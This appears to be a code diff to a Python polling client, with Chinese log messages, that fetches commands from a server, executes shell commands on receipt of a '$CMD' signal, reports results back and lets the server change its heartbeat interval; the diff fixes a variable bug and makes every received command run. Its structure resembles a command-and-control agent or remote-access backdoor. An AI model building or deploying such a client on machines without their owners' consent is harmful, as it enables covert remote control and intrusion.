@@ -99,10 +99,11 @@ def execute_command(cmd_str):
         if signal=="$CMD":
             return sys_command(command)
         elif signal=="$HBTIME":
-            POLL_INTERVAL = str(command)
+            global POLL_INTERVAL
+            POLL_INTERVAL = int(command)
             return f"'{CLIENT_ID}' changed heartbeat time",command
         else:
-            return f"'{CLIENT_ID}' received illegal command",command
+            return f"'{CLIENT_ID}' received illegal command",signal
     except Exception as e:
         return f"'{CLIENT_ID}' error execusing command",e
 
@@ -150,16 +151,10 @@ def polling_loop():
             log(f"轮询返回: isme={is_me}, cmd={cmd}")
 
             if is_me:
-                if cmd == "$SIGNUP":
-                    log("收到 $SIGNUP 标记，无需执行")
-                elif cmd == "$NOT_ME":
-                    # 理论上 isme=true 不会出现 NOT_ME，但保留逻辑
-                    pass
-                else:
-                    # 真正的命令，执行并提交结果
-                    head, body = execute_command(cmd)
-                    if head is not None:
-                        submit_response(head, body)
+                # 真正的命令，执行并提交结果
+                head, body = execute_command(cmd)
+                if head is not None:
+                    submit_response(head, body)
         else:
             log("轮询无效响应，稍后重试", "WARN")
 
